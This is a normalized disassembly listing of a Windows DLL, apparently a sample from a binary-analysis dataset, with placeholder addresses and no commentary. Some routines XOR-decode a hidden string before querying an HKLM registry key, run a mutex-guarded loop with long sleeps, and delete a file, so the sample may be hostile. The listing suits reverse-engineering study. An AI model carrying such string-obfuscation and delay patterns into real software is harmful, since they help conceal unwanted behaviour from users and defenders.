mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10035ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f65f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ eax + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_10008200
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x5
cmp eax edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx edi
je r-xdata
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
inc [ ebx ]
mov eax [ eax ]
cmp eax edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov ecx [ ebp - 0x18 ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
sub_10036184
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019b04
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_100361ab
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_10036280
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100036b3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10036350
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push edx
call sub_10004570
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10051390
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_100363a0
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov [ eax ] edx
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
retn
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov [ eax ] edx
retn
sub_10036400
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
cmp esi eax
je r-xdata
mov [ ebp + 0xc ] esi
cmp esi eax
jne r-xdata
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
inc esi
push ebx
mov ebx eax
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
inc esi
cmp esi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
mov [ eax ] edi
pop edi
pop esi
pop ebp
retn
movsx ecx [ esi ]
push ecx
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
inc esi
cmp esi ebx
jne r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc edi
sub_10036463
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10020a90
pop ecx
sub_10036490
push ebp
mov ebp esp
mov eax [ edi + 0x110 ]
sub esp 0x8
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push esi
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edx [ edi + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x104 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov eax edx
cmp eax esi
je r-xdata
cmp [ ecx + 0xd4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] edx
cmp edx esi
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0x104 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x110 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
inc [ edi + 0x10c ]
cmp [ edi + 0x10c ] 0x3
jb r-xdata
lea ebx [ edi + 0x14 ]
add eax 0x4
cmp eax esi
jne r-xdata
cmp ecx [ eax ]
je r-xdata
mov ecx [ edi + 0x110 ]
push 0xffffffff
push ecx
call ebx
mov edx [ edi + 0x110 ]
push edx
mov [ edi + 0x104 ] 0x0
call esi
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
mov [ edi + 0x108 ] 0x0
call ebx
cmp [ edi + 0x104 ] 0x0
je r-xdata
push 0x0
mov [ edi + 0xc0 ] 0x0
call sub_10050bf0
test eax eax
je r-xdata
push eax
call sub_10050bf0
test eax eax
je r-xdata
jmp r-xdata
mov edx eax
mov eax [ edi + 0x110 ]
push eax
mov [ edi + 0x108 ] 0x1
call esi
lea ecx [ ecx ]
lea ecx [ edi + 0x14 ]
push ecx
mov [ edi + 0x108 ] 0x1
mov [ edi + 0x10c ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0x104 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov [ edi + 0xc0 ] 0x1
call sub_10050bf0
test eax eax
je r-xdata
mov ecx [ edi + 0x110 ]
push ecx
call esi
push 0x1b7740
call [ Sleep@IAT ]
mov edx [ edi + 0x110 ]
push 0xffffffff
push edx
call ebx
cmp [ edi + 0x104 ] 0x0
jne r-xdata
push 0x2
mov [ edi + 0xc0 ] 0x2
call sub_10050bf0
test eax eax
je r-xdata
mov ecx [ edi + 0x104 ]
mov [ edi + 0xc0 ] 0x3
push ebx
mov [ ecx + 0xd4 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0x110 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
push 0x927c0
call [ Sleep@IAT ]
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
cmp [ edi + 0x104 ] 0x0
je r-xdata
mov ecx [ edi + 0x110 ]
push ecx
call esi
mov ebx [ WaitForSingleObject@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push ebx
mov [ edi + 0x104 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ edi + 0xc0 ]
mov esi [ edi + 0x104 ]
cmp eax 0x3
je r-xdata
mov ebx [ WaitForSingleObject@IAT ]
sub_10036728
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_100367b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_100367b0
mov esi [ esi ]
push edi
call sub_10065045
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_100367f0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi ecx
sub edi eax
xor edi edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100208e0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub eax ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
add esi edi
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn 0xc
mov esi [ esi ]
sub_10036840
push ebp
mov ebp esp
push 0xffffffff
push sub_10080a86
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx esi
call [ r--data ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] 0x0
mov [ esi + 0x94 ] cx
call sub_1000e930
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x94 ]
push eax
call sub_10065045
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov eax [ eax ]
sub_10036a70
push ecx
cmp [ edi ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
pop ecx
retn
mov eax [ edi ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
test ebx ebx
jne r-xdata
push esi
call sub_10016870
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10036aac
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10052185
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10036aca
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_1004c551
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10036b00
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffed
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x27
jb r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x68 ]
push edx
push 0x80000002
mov [ ebp - 0x1a ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
lea edx [ ebp - 0x18 ]
mov eax 0x1b
call sub_10036cd0
lea edx [ ebp - 0x74 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x6c ]
lea ecx [ ebp - 0x70 ]
push ecx
push 0x0
lea edx [ ebp - 0x18 ]
push edx
push eax
mov [ ebp - 0x74 ] 0x4
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor ecx ecx
cmp eax 0x2
setne cl
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x6c ]
push edx
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi 0x2
setne al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x78 ] eax
pop esi
setne al
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10036c0f
push 0x38
mov eax sub_1007e82c
call sub_10007703
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10010e0d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002a730
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10019c00
retn 0x20
sub_10036cd0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10036d11
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_10061855
pop ecx
push eax
mov esi r--data
push esi
call sub_100783e0
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_1007b490
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_10061855
pop ecx
push eax
push esi
call sub_100783e0
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_10012991
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_1007d680
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_10036f20
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fc18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_1005d090
cmp ebx edi
je r-xdata
push edi
push edi
push edi
push edi
push ebx
push eax
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
inc eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push 0x0
push 0x0
mov edi eax
mov eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_1005d090
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_100172f0
lea ecx [ ebp - 0x2c ]
call sub_10021250
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
mov ecx esi
call sub_1003feb0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10037054
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1007cae9
pop edi
pop ebp
retn
sub_10037073
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1002097b
